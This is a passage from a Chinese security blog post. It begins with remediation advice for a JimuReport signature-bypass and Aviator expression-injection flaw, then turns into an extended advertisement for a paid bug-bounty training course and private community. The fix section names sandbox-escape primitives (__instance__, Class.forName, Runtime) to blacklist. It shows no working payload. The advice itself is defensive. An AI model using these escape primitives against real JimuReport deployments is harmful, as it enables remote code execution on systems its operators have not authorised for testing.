 中 /auto/export/python/plugin  
 分支不得使用硬编码的 PRINT_PLUGIN_SIGN_SECRET  
，应统一改为读取服务端配置 jeecg.jmreport.signatureSecret  
，并强制要求部署方替换默认值、在启动时校验密钥非空非默认。  
  
1. **补强鉴权**  
：移除该接口的 @JimuNoLoginRequired  
，或在 @JimuSignature  
 之外叠加真实会话鉴权；签名只能作为防重放的辅助手段，不能作为唯一访问控制。  
  
1. **收敛表达式执行面（根因）**  
：getBaseSql  
 中不要对用户可控的 queryParam 值调用 ExpressUtil.a  
 做动态求值；若确需计算，应：  
  
- 仅允许白名单函数与常量字面量，禁止 __instance__  
/__env__  
/seq  
/反射/Class.forName  
 等逃逸原语；  
  
- 用独立的、更严格的 Aviator 实例（关闭 seq  
 与 InternalVars  
 等），或在执行前对表达式做 AST 级黑白名单校验；  
  
- 更彻底地，将参数求值放到服务端可信上下文中，杜绝“用户输入即代码”。  
  
1. **升级 Aviator 并关注其安全公告**  
：关注 com.googlecode.aviator  
 沙箱逃逸相关修复，及时升级依赖。  
  
### 10.3 修复验证  
  
重放原始 POC：伪造签名的请求应被拒绝（返回签名校验失败），且即使签名正确，含 __instance__  
/Class.forName  
/Runtime  
 等逃逸原语的表达式应被表达式引擎拒绝执行，命令不再产生副作用。  
  
02  
  
0x2 培训课程介绍  
  
26  
  
**SRC漏洞挖掘培训课程**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/6cIuvSQkkicOHhYFkQLTibYAMUR9rfZ9eUrI78toIC4V2304G909O6s6CnVrAGiaYLEJM9XuUARhzNfxCtYKQfQ83wfPSlqpshSScfoYzSKzgY/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&watermark=1&tp=wxpic#imgIndex=4 "")  
  
  
**1.课程价格目前是575（后面也会随着人数越多，涨价）🌟师傅们还可以上车补票，冲冲冲！**  
  
**2.报名成功送知识星球一个，拉内部小圈子交流群+SRC直播通知群！✨**  
  
**3.一周2节课程，直播+录播形式，课程内容大家可以看课表，目前是第一期，一次报名永久无限听课！❤️**  
  
**4.目前是第一期课程，后面比如说开了二、三期，都是不用在花钱的！**  
  
**5.上课结束后，会把视频录播+课件笔记一起打包发直播群！**  
  
**6.哔哩哔哩SRC课程公开课，链接🔗直达：**  
  
**https://space.bilibili.com/642258933**  
  
SRC课程详情🔎：  
[学了一堆理论，还是挖不到漏洞？你缺的是实战！](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247509869&idx=1&sn=4bd678e9f9c864300cc2426432a8c967&scene=21#wechat_redirect)  
  
  
内部小圈子知识星球详情🔎：[50 元封顶！渗透攻防 + SRC 漏洞星球限时开放！](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247509408&idx=1&sn=2e12452dfc2d34631af5109af28a6758&scene=21#wechat_redirect)  
  
  
欢迎关注公众号：  
神农Sec  
，报名咨询添加VX：  
routing_love  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/mcko8AHj6QVcCkxIUpaBmNic17zibGfXMWrr9z89gE0DFtbOu3QYzD5d62zsp6qwc38Pssk60mLq8VKthcMOmctVlHU716S5G4KYmrKVrEj5c/640?wx_fmt=other&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
开课快五个月时间  
，课程目前已经  
累计加入了1000+个学员  
了，课程培训招生任火热持续中，师傅们  
对于我们课程感兴趣的，想要学习技术，找工作的可以咨询我报名  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QVmdLBDlbl5p4Teyw5qqFOIFTIUxIxRay83I5qDXG690XI61gRj8MXTvTaibC4q2cCb1CbM4XS2FK6X4KYhPTX2ibgvA363YYwcE/640?wx_fmt=png&from=appmsg "")  
  
课程培训记录📝，每次上车在1-3小时之间，上课包括课程内部群大家  
交流氛围很好！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/mcko8AHj6QV7iczVHowN13BzCTraG8jDUoe5hluiaZ90RUy7FjW398DictcrZhHrYpMgw4polRqvlGua6iakYdARPI3Jkiahhjvrvkviblm19U4F0/640?wx_fmt=other&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4 "")  
  
课程上课笔记课件📒都会打包给师傅们，笔记都非常详细，很多几k价格的培训机构哪怕是课件笔记都没有的，我这里都是下课第一时间把  
录播+笔记打包发给大家！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWbRV4mBn8GZHrvHocPMYYcBuAM3gyIKOM0SicBWQhywMehkXInvEerRLySOPPMzEmM2GLSlOMFREx6QItqtCgCibGs2MeY6yvu0/640?wx_fmt=png&from=appmsg "")  
  
平常也都会给学员进行一些项目发布，包括后面的  
工作、护网内推等，经常上麦交流，大家互相学习，简历优化等。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXvjjkgJibDEUhdDjErjibiangGsN0rqb0Av59xfyxBbDrTMNdfIAhNXlx0HQKvxIVBIEGAAbYrEENzd77j65asejlD4a50Sb4U7o/640?wx_fmt=other&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=20 "")  
  
SRC漏洞挖掘课程培训已经两个星期了，期间也是创建了  
“回本小群”，希望学员回本越来越多，创建这个群主要是鼓励学员学习进步，以及不定时发小项目！  
  
最后也是希望大家都可以赚钱，找到好工作🎉  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXub8yvlURuxKpiclvOJ83GJ6Is7StibGAxD7DHtMHD7yT6BGRxxETEza4qJejZkRVxdYUIicoFWdaPVWXReicG6N2ne806ajRd8Ls/640?wx_fmt=png&from=appmsg "")  
  
培训时间不长，感谢🙏师傅们的  
喜报  
，很开心看到师傅们给我分享自己的成果，  
希望师傅们越来越强！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUMAtEWv3xXZPDsGBRhESmwGRciaasCGibU8TtbP2U0YVZPBdf5tlLqpWAtQKBh5oFwgETyvicKBeW1JSsekAyJ5cbRlSdjooQkSM/640?wx_fmt=other&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=22 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUrS4N68nZ0EyE76Wkib7ZDrpnZWw2Q1RJQvFEdIOu5XvFGCwpz9lziabKyo9C9d5ZiamibuSXlibhXLHb7b8QJhqEIs3hXvqktkkyA/640?wx_fmt=png&from=appmsg "")  
  
  
平常也会分享项目，下面是一些  
学员项目成果  
，群里报课的学员都是不抽成的，主要是帮助学员进行  
回本  
，  
让大家都可以进步！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWS8lR4pmzZrczwr6YjtG48EqF9q4FlAUH78M7DXkiboqF8Q1HkeWJLzpFPOQBToO3auj8r4rU9x3fuafXUDVMEcFj5EI6U3P9w/640?wx_fmt=other&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=23 "")  
  
上课结束后，会把  
视频录播+课件笔记  
一起打包发直播群  
  
**「神农安全」**  
知识星球目前已经  
累计2500+网络安全爱好者的加入！  
  
后面也是小圈子做大起来了，师傅们也都喜欢看我文章，想着给大家教下src漏洞挖掘思路，所以自己花了很长时间做了✨  
课件和课表，都是纯自己手搓的，大家也可以看下课表的内容。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthM2sjuWQFbmvWv79V058KwI0DswFF9LysewGtULj81Vp5bX9nTEK78A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVhliaOc71FnQLZjEUB2QiavqaRdiaaAN25Gb1HNADIy0cYvIIHC46za7Ab6sibRKvKG2tbJBxqrOGyczqWF44LQOKllnZXE6PU5iaE/640?wx_fmt=png&from=appmsg "")  
  
03  
  
0x3 课程特色  
  
课程  
主打真实，  
一线SRC漏洞挖掘师傅是如何学习和挖掘SRC漏洞的，让你真正了解SRC漏洞挖掘，助力在岗人员和大学生的能力提升，掌握新的技能树，为下一次  
跳槽涨薪做好准备。本  
课程内容覆盖企业  
SRC、众测项目挖掘、护网HVV红蓝攻防技巧、CVE、CNVD、EDUSRC等平台通杀案例技巧挖掘方法。  
  
本课程  
适合人群  
（光看不挖啥也不会）  
```
1、有计算机经验，想从0转行入行的大学生或自学者
2、想从CTF比赛/Web或SRC进阶到项目实战的选手
3、想参与项目/找工作/提高收入的转型者
4、想通过挖SRC赏金做副业的师傅们
5、挖SRC漏洞遇到瓶颈的师傅们
6、想学习AI安全自动化渗透测试漏洞挖掘的师傅
```  
  
课程价格：575 元  
  
报课成功的师傅们直接免费送内部小圈：一个知识星球+内部小圈子交流群  
```
1、课程价格真心实惠，绝不割韭菜
2、四五百的课程价格让你体会大几千的培训课程内容
3、带着大家从0到1，本人上课坚持手搓课件（实战案例+知识体系）
4、拒绝使用PPT演讲模式（无实操，很枯燥）
```  
  
直播培训教学方式  
  
课程  
一周1-2节课，课程特色涵盖直播多人上麦活跃回答，直播过程中有问题随时解决或私信我。  
拉群：一个知识星球内部小圈子交流群+课程培训直播通知群。有项目/工作/护网第一时间内推报课的师傅，  
一对一简历优化，助力在岗人员和大学生的能力提升。  
  
一次报名每期均可永久学习，并且赠送内部「神农安全」知识星球，一对一永久解答、无保留教学！  
  
欢迎关注公众号：  
神农Sec  
，报名咨询添加VX：  
routing_love  
  
课程均为线上交付，报名成功后  
不支持退款  
  
内部小圈子  
（知识星球+内部小圈子交流群+知识库）  
  
对内部小圈子感兴趣的师傅们也可以看下下面的这个  
跳转链接，里面有对小圈子的详细介绍，报名课程成功的师傅们直接免费送一个（直接点击下面直接可以跳转）。  
  
[强烈推荐一个永久的SRC挖掘、渗透攻防内部知](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247508882&idx=1&sn=0ca5ab133a5b589e26e25de14882b28f&scene=21#wechat_redirect)  
  
[‍](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247508882&idx=1&sn=0ca5ab133a5b589e26e25de14882b28f&scene=21#wechat_redirect)  
  
[识库](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247508882&idx=1&sn=0ca5ab133a5b589e26e25de14882b28f&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVRzhiawbmNicgOFicLKeMZPtpyqtP9M0IA7gJZPerY1pI0P1Owcs0ttibWiaw87asg3qibyVF9NEVeGuxL3YqASaQhUn3pUBjicpMTPM/640?wx_fmt=png&from=appmsg "")  
  
讲师介绍  
  
id：一个想当文人的黑客  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QX6UX8mhQtia4qnfEiasbq2R3KjlwQg2ysg4ibj744R4DF0BXZQZBjHc3qNgPKkqG7msub5w6WjSmoElCibibTp6qImS3FkupITqJUk/640?wx_fmt=png&from=appmsg "")  
  
欢迎关注公众号：神农Sec，报名咨询添加VX：  
routing_love  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
04  
  
0x4 第一期挖洞培训课表内容  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXdFkU8hwaxia8XQ7EyshqMb1BUOknbNI4lhtliaE0iakNZ0PRmjBUocUGbGDmEaGwuZDDP4sXkOrjicxI1exTafD6wdNUTj66wCWw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍（报课赠送）**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
10、十个专栏会持续更新~提前续费有优惠，好用不贵很实惠
11、每日内部资料分享，内部圈子资料1000+
12、联系圈主获取：内部漏洞知识库+圈子使用手册+内部圈子交流群
13、VX：routing_love，技术交流+疑问解决
```  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
0x5   
优秀学员报喜  
  
下面是最近两个月培训期间，很多  
优秀学员进行报喜，看到师傅们有收获，也是感到很开心的！  
拉回本小群，就是为了促进大家学习，在群里发学员成果，也是为了让大家学习优秀的师傅们。  
  
加油，你我皆是黑马！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWS8lR4pmzZrczwr6YjtG48EqF9q4FlAUH78M7DXkiboqF8Q1HkeWJLzpFPOQBToO3auj8r4rU9x3fuafXUDVMEcFj5EI6U3P9w/640?wx_fmt=other&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=23 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWkBFHe0S1MayHGboNyYGhNR94Fic11frXxdUGBgjjIx6dnJ6lgWxw7iajkmFTiczQq5DHN1bwUchcVzatv95E5gibAMUiaZ7fHlypw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QU6ibZutPq43zUiap7IgDmJq7kwUKJBCa2IDujYiadMJfe9fFH9DOfUEOM2TibibYRuFiahDqMnBX1MVjLw5XIdNDSuR5P3g7XibaUkBo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVz2wFpVfer0uAFVpLKyicMaaLkmJDdg5bWnOotuzN3S9r2FMKpEKrJy8ND7icWVzNgqyYS2J6XElVN43vGca4X6HcEqapwGcNX0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWoKYrxQzob221aCmicmemD3aVPbk5dvVIaEic4TNPXrnkRazOTHnIbq87Jbk0GREdlI4iaZUmVU3c6K6rBbyZzBnkicooOUVtzN1I/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWdSycCicsfpn14HlUgEibU04lpXJ4a70L4D6oSWx5s0tLgnLnLiaRAdclxNVicYKFRD1mGn40jQ4t4ic8XZzVoOSTTCzY9xz9auzJI/640?from=appmsg&wxfrom=12&wx_fmt=other&tp=webp&usePicPrefetch=1&watermark=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVRqR4bI22pibTSVQVSibImicNHOCUGQAaUlo9lZsNJicLmcTaQKl662ulqoX54EmbCDKUD3ibibdZxqKaOJAcoyIV7cAn7tKqia8S470/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXB1O6Fx3ia62NNWITh9vUQaEKp7epibLWeEsdobibvBvqNDoTCAvfyQFHw597O24naJAIpM4QALgfqMWWc4E1KHrxBoaGRxE4Ajc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXnjwIRWjJOVSuN4X4HjmEFtCVqCHZ05M77sXqzmVjibaJbLUw3ApOuz7iaH8OCCnRmTRYVtKC5NajGKVkI4pnKZsJaj0T4iaYibq0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWRdtEUY2aeAZh34wDle515j7UwnibFQeCibWSeDKGnIZ2YH5VGX64cYeXgPGdCwHLKdsMY07EIVliapxh10gzQ2EO3bks7bxhmVs/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QW7rozFqSBVNRDE2kbfUSB4FefOPm9LXM2B9bV4n9VPM7Kt11rfw284Ejn4AHUc1Uc1r1gZs3FF6umgPk1QejcC6zrOAYEyegY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QV0epFsicbJrNPgGwNXcXRCDrC1sGQySI2ylkfs2Hdic6d6unjwqNiby5DfhtfT6ezabX13bNeR53pOW3BUqLaZrIvPM8Z4IsBpgI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXwfrgic5XLseOxkPOWkjm1yicAW2ZiaAqzxtbjPok4Yhic2Wiblic93SSGN5BtT77AFuZt6ySuRL09icqIicPuOUUbL5NbWgMCHgLictiak/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/mcko8AHj6QU7jGMRbvGyeDmHE6KjibHDNmuqO2NDaG4soIjTtg6uQoy4H5x0FntPDicjnUtibVgFMTNvNRaA9SJicNj2BIWQNz2vfRaQDfkKsibI/640?wx_fmt=jpeg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUyyXAWlMf8dHcspnMDucUzRBbeXWW58yMWQncvENPDmIpEKr4HlZ0cyWZSLGiakB03zRmvicfIF79LdWQ6s6VOyxl44WgvMwzf4/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QX83LJfPytAENC2dGNwhg0pFd7as7FhJZum31EJkbnicO88ZNIwXflHjpsuQV3I0BQIRkNzbVy2nkhMicice6QDO6gMkdg5RLiboiaA/640?wx_fmt=png&from=appmsg "")  
  
  
  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mcko8AHj6QVOEGwHSvWmZdtYpN4SBDudos5e9trbzcia1KBOnDpEpmQicd3wGulBjXWRGqMMZbAf7jogvwv0sbVoPJB8iaf1ib5GYtJ0zvXVNL8/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mcko8AHj6QV9grs7NOhSTCfTpCc4xrxdnlISIReNNCKR2EOyWvhMpyIzbma8nuelSg8LicKF5yYZ7hgyODlWgMmhViaE8Ahhs7PZlnmA0VFcY/640?wx_fmt=jpeg&from=appmsg "")  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
